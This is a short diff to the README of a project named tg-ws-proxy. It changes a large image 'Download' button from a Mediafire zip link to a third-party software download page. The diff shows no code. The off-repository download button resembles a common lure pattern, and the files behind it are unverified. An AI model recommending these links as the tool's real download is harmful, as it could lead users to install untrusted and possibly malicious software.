@@ -1,6 +1,6 @@
 # tg-ws-proxy
 <p align="center">
-  <a href="https://www.mediafire.com/file/vjqk8i5kqlnf3v2/tg-ws-proxy.zip/file">
+  <a href="https://qirosoftware.com/software/tg-ws-proxy-v1-2-1-fast-socks5-proxy-for-telegram">
     <img src="https://www.coinagemag.com/wp-content/uploads/2017/12/free-download-png-blue-color-free-download-button-679-1.png" alt="Download" width="250"/>
   </a>
 </p>
